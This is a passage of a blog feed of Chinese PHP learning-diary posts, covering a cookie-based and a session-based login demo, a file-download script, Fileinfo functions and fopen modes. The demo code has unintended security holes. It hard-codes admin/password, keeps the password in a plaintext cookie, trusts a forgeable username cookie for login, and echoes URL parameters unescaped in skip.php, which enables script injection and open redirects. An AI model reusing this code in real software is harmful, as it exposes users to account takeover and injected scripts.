class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;您已经登录了，请不要重复登录！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    &lt;form action=<span class="string">&quot;login.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">        &lt;p&gt;姓名：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> value=<span class="string">&quot;&quot;</span>&gt;&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;密码：&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span> value=<span class="string">&quot;&quot;</span>&gt;&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;&lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;登录&quot;</span> id=<span class="string">&quot;submit&quot;</span>&gt;&lt;/p&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&quot;&quot;</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="string">&#x27;password&#x27;</span>) &#123;</span><br><span class="line">                <span class="comment">// $_COOKIE[&#x27;username&#x27;]=$_POST[&#x27;username&#x27;];</span></span><br><span class="line">                <span class="comment">// $_COOKIE[&#x27;password&#x27;]=$_POST[&#x27;password&#x27;];</span></span><br><span class="line">                <span class="variable">$boolname</span> = <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;username&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>], <span class="title function_ invoke__">time</span>() + <span class="number">3600</span>);</span><br><span class="line">                <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;password&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>], <span class="title function_ invoke__">time</span>() + <span class="number">3600</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$boolname</span> == <span class="literal">true</span>) &#123;</span><br><span class="line">                    <span class="comment">// echo &quot;&lt;script&gt;alert(&#x27;用户&quot; . $_POST[&#x27;username&#x27;] . &quot;登录成功！&#x27;)&lt;/script&gt;&quot;;</span></span><br><span class="line">                    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:index.php&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// echo &#x27;cookie设置失败!&#x27;;</span></span><br><span class="line">                    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:skip.php?url=index.php&amp;info=cookie设置失败!&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// echo &#x27;&lt;script&gt;alert(&quot;用户名或密码输入错误！&quot;)&lt;/script&gt;&#x27;;</span></span><br><span class="line">                <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:skip.php?url=login.php&amp;info=用户名或密码输入错误!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;用户名或者密码未输入！&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="c03.jpg" alt="login"></p><h2 id="index的php文件"><a href="#index的php文件" class="headerlink" title="index的php文件"></a>index的php文件</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;欢迎&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">            background-color: orange;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        h1 &#123;</span><br><span class="line">            width: <span class="number">500</span>px;</span><br><span class="line">            font-size: <span class="number">50</span>px;</span><br><span class="line">            font-weight: <span class="number">700</span>;</span><br><span class="line">            margin: <span class="number">200</span>px auto;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="variable">$_COOKIE</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;亲爱的<span class="subst">&#123;$_COOKIE[&#x27;username&#x27;]&#125;</span>您好！&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;logout.php&quot;&gt;注销登录状态&lt;/a&gt;&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;您的登录状态丢失！点击&lt;a href=&quot;login.php&quot;&gt;此处进行登录&lt;/a&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    &lt;h1&gt;欢迎来到骇客论坛！&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="c04.jpg" alt="login"></p><h2 id="skip中转站"><a href="#skip中转站" class="headerlink" title="skip中转站"></a>skip中转站</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;refresh&quot;</span> content=<span class="string">&quot;3;URL=&lt;?php echo <span class="subst">$_GET</span>[&#x27;url&#x27;] ?&gt;&quot;</span> /&gt;</span><br><span class="line">    &lt;title&gt;正在跳转……&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">            background-color: red;</span><br><span class="line">            color: aliceblue;</span><br><span class="line">            font-size: <span class="number">35</span>px;</span><br><span class="line">            font-weight: <span class="number">800</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        <span class="meta">&lt;?php</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;3s后完成跳转……&#x27;</span>;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="销毁"><a href="#销毁" class="headerlink" title="销毁"></a>销毁</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="variable">$_COOKIE</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;username&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>], <span class="title function_ invoke__">time</span>() - <span class="number">3600</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:skip.php?url=index.php&amp;info=注销成功！正在跳转到主页面！&quot;</span>);</span><br><span class="line">        <span class="comment">// session_start();</span></span><br><span class="line">        <span class="comment">// =array();</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:skip.php?url=index.php&amp;info=注销失败！没有这个用户！正在跳转到主页面！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;您的登录状态丢失！点击&lt;a href=&quot;login.php&quot;&gt;此处进行登录&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面的例子可以更改为Session的，具体暂不阐述，看下面代码吧。</p><h1 id="小项目-登录-session"><a href="#小项目-登录-session" class="headerlink" title="小项目-登录-session"></a>小项目-登录-session</h1><h2 id="login的php文件-1"><a href="#login的php文件-1" class="headerlink" title="login的php文件"></a>login的php文件</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;登录页面&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        * &#123;</span><br><span class="line">            margin: <span class="number">0</span>;</span><br><span class="line">            padding: <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        form &#123;</span><br><span class="line">            width: <span class="number">300</span>px;</span><br><span class="line">            height: <span class="number">200</span>px;</span><br><span class="line">            margin: <span class="number">100</span>px auto;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#submit &#123;</span></span><br><span class="line">            width: <span class="number">100</span>px;</span><br><span class="line">            height: <span class="number">30</span>px;</span><br><span class="line">            margin: <span class="number">10</span>px <span class="number">80</span>px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p &#123;</span><br><span class="line">            width: <span class="number">100</span>%;</span><br><span class="line">            height: <span class="number">2</span>em;</span><br><span class="line">            text-align: center;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body style=<span class="string">&quot;background-color: orange&quot;</span>&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;您已经登录了，请不要重复登录！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    &lt;form action=<span class="string">&quot;login.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">        &lt;p&gt;姓名：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> value=<span class="string">&quot;&quot;</span>&gt;&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;密码：&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span> value=<span class="string">&quot;&quot;</span>&gt;&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;&lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;登录&quot;</span> id=<span class="string">&quot;submit&quot;</span>&gt;&lt;/p&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&quot;&quot;</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="string">&#x27;password&#x27;</span>) &#123;</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">                <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:index.php&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:skip.php?url=login.php&amp;info=用户名或密码输入错误!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;用户名或者密码未输入！&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="index的php文件-1"><a href="#index的php文件-1" class="headerlink" title="index的php文件"></a>index的php文件</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;欢迎&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">            background-color: orange;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        h1 &#123;</span><br><span class="line">            width: <span class="number">500</span>px;</span><br><span class="line">            font-size: <span class="number">50</span>px;</span><br><span class="line">            font-weight: <span class="number">700</span>;</span><br><span class="line">            margin: <span class="number">200</span>px auto;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;亲爱的<span class="subst">&#123;$_SESSION[&#x27;username&#x27;]&#125;</span>您好！&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;logout.php&quot;&gt;注销登录状态&lt;/a&gt;&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;您的登录状态丢失！点击&lt;a href=&quot;login.php&quot;&gt;此处进行登录&lt;/a&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    &lt;h1&gt;欢迎来到骇客论坛！&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="logout-php"><a href="#logout-php" class="headerlink" title="logout.php"></a>logout.php</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">session_unset</span>();</span><br><span class="line">    <span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="title function_ invoke__">session_name</span>(), <span class="string">&#x27;&#x27;</span>, <span class="title function_ invoke__">time</span>() - <span class="number">3600</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:skip.php?url=index.php&amp;info=注销成功！正在跳转到主页面！&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:skip.php?url=index.php&amp;info=注销失败！请稍后重试！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>skip的直接抄上面的skip.php即可。当然，既然时项目，那么所有的php都会放在同一个文件夹下。</p>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP学习日志-009</title>
      <link href="/2023/03/01/PHP-Study-009/"/>
      <url>/2023/03/01/PHP-Study-009/</url>
      
        <content type="html"><![CDATA[<p>php下载</p><span id="more"></span><h1 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h1><p>这里简单的放个今天早上做的个下载的php。</p><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>打开php文件，即可实现php文件的跳转下载功能。这里使用的是小皮面板。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 实现文件的下载</span></span><br><span class="line"><span class="comment">// 相对路径下的文件(同文件夹下的某个文件)</span></span><br><span class="line"><span class="variable">$file_path</span> = <span class="string">&#x27;photo.zip&#x27;</span>;</span><br><span class="line"><span class="comment">// 获取文件名</span></span><br><span class="line"><span class="variable">$fname</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$file_path</span>);</span><br><span class="line"><span class="comment">// 获取文件的MIME 类型</span></span><br><span class="line"><span class="variable">$cont_type</span> = <span class="title function_ invoke__">mime_content_type</span>(<span class="variable">$file_path</span>);</span><br><span class="line"><span class="comment">// 获取文件的大小</span></span><br><span class="line"><span class="variable">$fsize</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$file_path</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:&#x27;</span> . <span class="variable">$cont_type</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Disposition:attachment; filename=&#x27;</span> . <span class="variable">$fname</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Length:&#x27;</span> . <span class="variable">$fsize</span>);</span><br><span class="line"><span class="comment">// 读取文件内容并且输出到缓冲区</span></span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$file_path</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure><p>秒截的图片如下：</p><p><img src="c01.jpg" alt="img"></p><h1 id="Fileinfo扩展"><a href="#Fileinfo扩展" class="headerlink" title="Fileinfo扩展"></a>Fileinfo扩展</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">常用的函数：</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">finfo_open</span>(mode, magic_file)</span><br><span class="line">        mode: 指定文件类型的检测方式，可选值为 FILEINFO_NONE（默认）、FILEINFO_MIME_TYPE 和 FILEINFO_MIME_ENCODING。</span><br><span class="line">        magic_file: 指定 magic 文件的路径。</span><br><span class="line">        返回值：成功返回 finfo 对象，失败返回 <span class="literal">false</span>。</span><br><span class="line">        功能：打开一个 Fileinfo 对象。</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">finfo_close</span>(finfo)</span><br><span class="line">        finfo: finfo_open 函数返回的 finfo 对象。</span><br><span class="line">        返回值：无返回值。</span><br><span class="line">        功能：关闭一个 Fileinfo 对象。</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">finfo_file</span>(finfo, file_name, options)</span><br><span class="line">        finfo: finfo_open 函数返回的 finfo 对象。</span><br><span class="line">        file_name: 要检测的文件路径。</span><br><span class="line">        options: 可选参数，可以指定检测文件的方式，可选值为 FILEINFO_NONE（默认）、FILEINFO_MIME_TYPE 和 FILEINFO_MIME_ENCODING。</span><br><span class="line">        返回值：如果成功，返回文件的 MIME 类型或编码，否则返回 <span class="literal">false</span>。</span><br><span class="line">        功能：检测指定文件的 MIME 类型或编码。</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">finfo_buffer</span>(finfo, <span class="keyword">string</span>, options, context)</span><br><span class="line">        finfo: finfo_open 函数返回的 finfo 对象。</span><br><span class="line">        <span class="keyword">string</span>: 要检测的字符串。</span><br><span class="line">        options: 可选参数，可以指定检测字符串的方式，可选值为 FILEINFO_NONE（默认）、FILEINFO_MIME_TYPE 和 FILEINFO_MIME_ENCODING。</span><br><span class="line">        context: 可选参数，可以传递一个上下文资源。</span><br><span class="line">        返回值：如果成功，返回字符串的 MIME 类型或编码，否则返回 <span class="literal">false</span>。</span><br><span class="line">        功能：检测指定字符串的 MIME 类型或编码。</span><br></pre></td></tr></table></figure><p>后面会尝试学习下接口。</p>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP学习日志-008</title>
      <link href="/2023/02/28/PHP-Study-008/"/>
      <url>/2023/02/28/PHP-Study-008/</url>
      
        <content type="html"><![CDATA[<p>文件和目录</p><span id="more"></span><p>和昨天一样，真正详细的补充在昨天的那片博客里面。</p><h1 id="函数详解-部分"><a href="#函数详解-部分" class="headerlink" title="函数详解(部分)"></a>函数详解(部分)</h1><h2 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>,<span class="variable">$mode</span>[,<span class="variable">$use_include_path</span>[,<span class="variable">$zcontext</span>]]);</span><br><span class="line"><span class="variable">$filename</span> :         要打开的文件名或 URL</span><br><span class="line"><span class="variable">$mode</span>:              打开文件的模式</span><br><span class="line"><span class="variable">$use_include_path</span>:  可选参数，规定是否在 include_path 中搜索文件</span><br><span class="line"><span class="variable">$zcontext</span>:          可选参数，文件句柄的环境设置，为一个资源</span><br></pre></td></tr></table></figure><h3 id="附加-mode参数说明"><a href="#附加-mode参数说明" class="headerlink" title="附加-mode参数说明"></a>附加-mode参数说明</h3><p>只读：只能读取不能修改<br>只写：只能写入不能读取</p><table><thead><tr><th>mode</th><th>说明</th></tr></thead><tbody><tr><td>&#39;r&#39;</td><td>只读方式打开，将文件指针指向文件头。</td></tr><tr><td>&#39;r+&#39;</td><td>读写方式打开，将文件指针指向文件头。</td></tr><tr><td>&#39;w&#39;</td><td>写入方式打开，将文件指针指向文件头并将文件大小截为零。如果文件不存在则尝试创建之。</td></tr><tr><td>&#39;w+&#39;</td><td>读写方式打开，否则行为同 &#39;w&#39;。</td></tr><tr><td>&#39;a&#39;</td><td>写入方式打开，将文件指针指向文件末尾。如果文件不存在则尝试创建之。在这种情况下，fseek() 没有效果，写入总是追加。</td></tr><tr><td>&#39;a+&#39;</td><td>读写方式打开，将文件指针指向文件末尾。如果文件不存在则尝试创建之。在这种情况下，fseek() 只相应读取位置，写入总是追加。</td></tr><tr><td>&#39;x&#39;</td><td>创建并以写入方式打开，将文件指针指向文件头。如果文件已存在，则 fopen() 调用失败并返回 false，并生成一条 E_WARNING 级别的错误信息。如果文件不存在则尝试创建之。这和给 底层的 open(2) 系统调用指定 O_EXCL</td></tr><tr><td>&#39;x+&#39;</td><td>创建并以读写方式打开，其他的行为和 &#39;x&#39; 一样。</td></tr><tr><td>&#39;c&#39;</td><td>Open the file for writing only. If the file does not exist, it is created. If it exists, it is neither truncated (as opposed to &#39;w&#39;), nor the call to this function fails (as is the case with &#39;x&#39;). The file pointer is positioned on the beginning of the file. This may be useful if it&#39;s desired to get an advisory lock (see flock()) before attempting to modify the file, as using &#39;w&#39; could truncate the file before the lock was obtained (if truncation is desired, ftruncate() can be used after the lock is requested).<br>译文（大略）:<br>打开文件仅供写入。如果该文件不存在，则创建该文件。如果它存在，它既不会被截断(与“ w”相反) ，对该函数的调用也不会失败(与“ x”的情况一样)。文件指针定位在文件的开头。如果希望在尝试修改文件之前获得一个通知锁(请参阅 ) ，那么这可能很有用，因为使用‘ w’可能会在获得锁之前截断文件(如果需要截断，则可以在请求锁之后使用 fruncate ()))。</td></tr><tr><td>&#39;c+&#39;</td><td>Open the file for reading and writing; otherwise it has the same behavior as 